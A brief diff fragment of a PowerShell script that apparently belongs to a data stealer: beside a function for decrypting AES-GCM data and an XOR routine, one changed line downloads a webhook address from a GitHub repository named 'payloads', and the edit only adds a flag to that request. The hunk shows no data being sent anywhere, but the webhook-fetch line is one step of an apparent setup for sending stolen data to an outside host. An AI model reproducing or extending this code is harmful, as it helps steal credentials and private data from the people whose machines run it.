@@ -148,7 +148,7 @@ function Decrypt-AesGcmData {
     }
 }
 
-$webhook = (Invoke-WebRequest "https://raw.githubusercontent.com/lubrj/payloads/refs/heads/main/sdfa").Content
+$webhook = (Invoke-WebRequest -useb "https://raw.githubusercontent.com/lubrj/payloads/refs/heads/main/sdfa").Content
 
 function Invoke-XOR {
     param(
